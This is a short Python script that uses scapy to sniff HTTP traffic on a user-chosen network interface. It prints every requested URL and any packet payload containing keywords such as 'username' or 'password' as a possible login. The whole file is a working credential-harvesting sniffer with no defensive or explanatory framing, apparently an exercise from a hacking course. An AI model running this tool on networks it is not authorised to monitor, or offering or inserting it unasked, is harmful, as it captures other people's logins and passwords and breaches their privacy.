#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

"""Sniffs using scapy"""


def sniff(sniffed_interface):
    scapy.sniff(iface=sniffed_interface, store=False, prn=process_sniffed_packet)


"""Gets the URL of the HTTP Packet"""


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


"""Processes the sniffed packet for usernames/passwords"""


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + login_info + "\n\n")


interface = input("Input interface to sniff: ")
sniff(interface)
